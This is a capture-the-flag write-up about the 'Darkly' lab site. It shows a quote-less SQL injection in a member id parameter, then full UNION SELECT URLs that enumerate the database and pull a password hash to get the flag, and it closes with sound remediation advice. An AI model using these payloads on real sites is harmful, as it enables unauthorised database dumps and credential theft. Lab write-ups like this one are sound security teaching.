HOW WE FOUND IT
On main page, find member page

parameter is an id for members, try it normally (1, 2, 3...), different accounts get returned
Question: How is this ID processed in the backend ? Is it through a SQL request ?

test for basic quote injection (1'), we get a SQL error message :
"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1"

it seems like quotes are escaped, meaning we can't use them to escape the current SQL command
BUT we might not even need to use quotes ! Maybe the developper didn't surround their SQL parameters with quotes in the first place...

we make a simple boolean test case to verify if the injection would work without quotes (1 and 1=1 | 1 and 1=0)

BINGO ! the first member (id 1) gets returned when using the 1 and 1=1 injection, and nothing gets returned when using 1 and 1=0 !
That's how the query must look like on the backend :
SELECT (?) from users where id=1 or 1=1

We know can procceed to enumerate the database, looking for juicy information...

enum databases :
http://darkly/?page=member&id=1+UniOn+Select+1%2CgRoUp_cOncaT%280x7c%2Cschema_name%2C0x7c%29+fRoM+information_schema.schemata&Submit=Submit#

get current database :
http://darkly/index.php?page=member&id=1+union+select+database%28%29%2Cnull&Submit=Submit#

enum current db tables :
http://darkly/index.php?page=member&id=1+union+SELECT+table_name%2Ctable_name+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase()%20limit%2010&Submit=Submit# 

enum all tables and associated columns :
http://darkly/index.php?page=member&id=1+union+select+table_name%2Ccolumn_name+from+information_schema.columns&Submit=Submit#

find hidden fields for table users :
http://darkly/index.php?page=member&id=1+union+select+Commentaire%2Ccountersign+from++users&Submit=Submit#

We find a comment explaining how to get the flag for the user 42 :
found md5 hash = 5ff9d0165b4f92b14994e5c685cdce28 --> md5sum of FortyTwo

Following the indications, we lower all characters and compute the sha256 sum of the string :
sha256sum of fortytwo (lower all chars) = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
(echo -n "fortytwo" | sha256sum)

SUCCESS ! We got the flag :)

PROBLEM
The member ID lookup is vulnerable to SQL injections. It is possible for an unauthenticated user to enumerate the whole database, compromising the entirety of the platform's confidentiality, and potentially its integrity too (using INSERT statements, DROP...).

SOLUTION
- Use frameworks instead of building SQL queries by hand
- Separate very clearly code from text, sanitizing the user input as much as possible, and being very careful when processing and using this user input
- The SQL account running the code should have as few privileges as possible, in order for an attacker to get limited power in case of SQL injection
- Disable verbose SQL error mode 
- Use parametarized queries, which are way less vulnerable to SQL injections (https://www.php.net/manual/en/mysqli.prepare.php)
